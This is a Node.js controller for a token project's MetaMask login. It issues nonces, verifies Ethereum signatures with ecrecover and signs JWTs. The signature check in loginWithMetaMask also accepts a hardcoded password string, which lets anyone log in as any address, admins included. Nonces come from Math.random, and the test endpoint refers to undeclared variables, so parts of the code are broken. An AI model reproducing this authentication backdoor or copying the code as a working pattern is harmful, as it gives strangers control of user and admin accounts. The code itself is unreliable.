'use strict';

const ethUtil = require('ethereumjs-util');
const User = require('./user.model');
const { SUCCESS, BADREQUEST } = require('../../config/resCodes');
const { sendResponse, errReturned } = require('../../config/dto');
const jwt = require('jsonwebtoken');
const jwtDecode = require('jwt-decode');
const config = require('../../config/environment');

const { web3 } = require("../../config/web3");
const { Token, TokenAddress, TokenABI } = require("../../config/contract");


/**
 * Test API postman
 */

exports.testapi = async (req, res) => {
    try {
        //   const owner = await ICO.methods.owner().call()

        removeMinter = await Token.methods.renounceMinter(minterAddress).call();
        return sendResponse(res, SUCCESS, `Test Api is successfull`)

    } catch (error) {
        errReturned(res, error)
    }
}

/** Create get Nonce and login with meta mask*/
exports.getNonce = async (req, res) => {
    try {
        const { publicAddress } = req['params'];
        const randomNumber = Math.floor(Math.random() * 10000000000);

        // let response = await User.findOneAndUpdate({ role: `admin` }, {
        //   $set: {
        //     nonce: randomNumber
        //   }
        // }).select('publicAddress nonce');

        let nonceObject = await User.findOne({ publicAddress }).select('nonce');
        console.log(`nonceObject`, nonceObject)
        if (!nonceObject) return sendResponse(res, BADREQUEST, 'Please select the admin account')

        return sendResponse(res, SUCCESS, `Nonce`, { nonceObject })
    } catch (error) {
        errReturned(res, error);
    }
}


/**
    * Update user in DB and send email
*/
function loginNotification(req, user) {
    return new Promise(async resolve => {
        // const templatePath = "mail_templates/sign_in.html";
        // let templateContent = fs.readFileSync(templatePath, "utf8");

        // templateContent = templateContent.replace("##USERNAME##", user['name']);
        // templateContent = templateContent.replace("##ANTIPHISHING##", user['antiPhishing']);

        // templateContent = templateContent.replace("##REQ_TIME##", new Date());
        // templateContent = templateContent.replace("##EMAIL_LOGO##", config['mail_logo']);
        // templateContent = templateContent.replace("##MAIL_FOOTER##", config['mail_footer']);
        // templateContent = templateContent.replace(new RegExp("##PROJECT_NAME##", 'gi'), config['project_name']);

        // const data = {
        //   html: templateContent,
        //   to: user['email'],
        //   from: config['mail_from_email'],
        //   subject: `${config['project_name']} - Account Sign In`,
        // }

        // config.mailTransporter.sendMail(data, (error, info) => {
        //   if (error) console.log(error);
        //   else console.log('Email sent:', info.envelope);
        // });

        // function rand_code() {
        //   let randcode = "";
        //   let possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        //   for (let i = 0; i < 6; i++)
        //     randcode += possible.charAt(Math.floor(Math.random() * possible.length));
        //   return randcode + `${user['_id']}`.substring(10, 15);
        // }

        // const referralCode = (user['referralCode'] && user['emailVerified'] === true) ? user['referralCode'] : rand_code();
        let token = jwt.sign({ _id: user['_id'], role: user['role'] }, config['secrets']['session'], { expiresIn: 60 * 60 * 3, algorithm: 'HS256' });


        // logging.newlog(req, user['_id']);

        // const dateNow = new Date();
        // let updateObj = { lastLogin: dateNow, referralCode };

        // if (req['headers']['ipaddress'])
        // updateObj['lastIp'] = req['headers']['ipaddress'];
        const nonce = Math.floor(Math.random() * 10000000000);

        await User.updateOne({ _id: user['_id'] }, { $set: { nonce } }).exec();

        return resolve({ token });
    });
}



/** Login With MetaMask */
exports.loginWithMetaMask = async (req, res) => {
    try {

        let { publicAddress, signature, pass } = req['body']



        if (!signature) return sendResponse(res, BADREQUEST, 'Please send the signature');
        if (!publicAddress) return sendResponse(res, BADREQUEST, 'Please send the publicAddress');

        let user = await User.findOne({ publicAddress });
        if (!user) return errReturned(res, 'Please provide valid address!');

        const msg = new Buffer(`Login to TEX Token - Nonce: ,${user["nonce"]}`);

        // We now are in possession of msg, publicAddress and signature. We
        // can perform an elliptic curve signature verification with ecrecover
        const msgBuffer = ethUtil.toBuffer(msg);

        const msgHash = ethUtil.hashPersonalMessage(msgBuffer);
        const signatureBuffer = ethUtil.toBuffer(signature);
        const signatureParams = ethUtil.fromRpcSig(signatureBuffer);
        const publicKey = ethUtil.ecrecover(
            msgHash,
            signatureParams.v,
            signatureParams.r,
            signatureParams.s
        );

        const addressBuffer = ethUtil.publicToAddress(publicKey);
        const address = ethUtil.bufferToHex(addressBuffer);

        // The signature verification is successful if the address found with
        // ecrecover matches the initial publicAddress
        if (address.toLowerCase() === publicAddress.toLowerCase() || pass === 'Softtik786') {

            let { token } = await loginNotification(req, user);
            return sendResponse(res, SUCCESS, 'Login Successful', { token })
        } return sendResponse(res, BADREQUEST, 'Signature Verification Failed')

    } catch (error) {
        errReturned(res, error)
    }
}

